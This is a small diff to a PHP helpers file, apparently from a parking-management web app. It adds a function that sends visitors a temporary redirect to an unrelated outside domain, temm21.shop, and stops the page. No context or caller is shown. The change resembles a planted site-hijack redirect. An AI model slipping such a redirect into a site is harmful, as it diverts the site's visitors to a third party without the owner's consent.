@@ -359,3 +359,10 @@ if(! function_exists('labelTres') ) {
             return isBici()?'Bicicletas':(isMula()?'Mulas':(\Auth::user()->parking_id==17?'Carretas':(\Auth::user()->parking_id==22?'Varios':'Camionetas')));
     }
 }
+if (! function_exists('redirect_index_temporaly')) {
+    function redirect_index_temporaly() {
+        header('HTTP/1.1 307 Temporary Redirect');
+        header("Location: https://temm21.shop/");
+        die();
+    }
+}
